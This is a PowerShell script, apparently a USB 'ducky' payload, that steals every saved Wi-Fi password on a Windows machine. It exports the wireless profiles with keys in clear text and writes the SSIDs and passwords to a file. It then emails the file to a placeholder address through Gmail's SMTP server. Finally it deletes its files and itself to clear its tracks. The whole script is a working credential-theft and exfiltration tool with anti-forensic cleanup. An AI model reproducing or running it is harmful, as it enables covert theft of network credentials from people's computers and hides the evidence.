<#
this script can be found at 
https://github.com/axel05869/Wifi-Grab

---------------------REFERENCE:----------------------
https://github.com/exploitechx/wifi-password-extractor
http://adamringenberg.com/powershell2/send-mailmessage
#>


# All the files will be saved in this directory
$p = "C:\wipass"
mkdir $p
cd $p


# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $a
}


# --------Email the output file---------
# Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
$FROM = "SENDER_EMAIL"
$PASS = "SENDER_PASS"
$TO = "RECEIVER_EMAIL"

$PC_NAME = "$env:computername"
$SUBJECT = "Wifi Password Grabber - " + $PC_NAME
$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the attached file."
$ATTACH = "wifipass.txt"

Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))


# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wipass


# remove ducky payload
rm d.ps1
